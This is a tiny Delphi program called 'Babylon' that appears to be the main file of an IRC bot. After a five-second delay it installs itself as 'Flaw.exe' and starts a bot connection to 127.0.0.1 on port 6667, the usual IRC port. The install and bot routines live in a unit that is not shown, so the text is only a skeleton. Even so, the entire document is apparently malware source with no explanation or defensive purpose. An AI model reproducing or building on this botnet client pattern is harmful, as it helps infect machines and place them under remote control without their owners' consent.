   program Babylon;

   uses
     Windows,
     Unit1 in 'Unit1.pas';

   begin
     Sleep(5000);
     Install('Flaw.exe', 'Flaw-Version-1.0');
     StartBot('127.0.0.1', 6667);
   end.
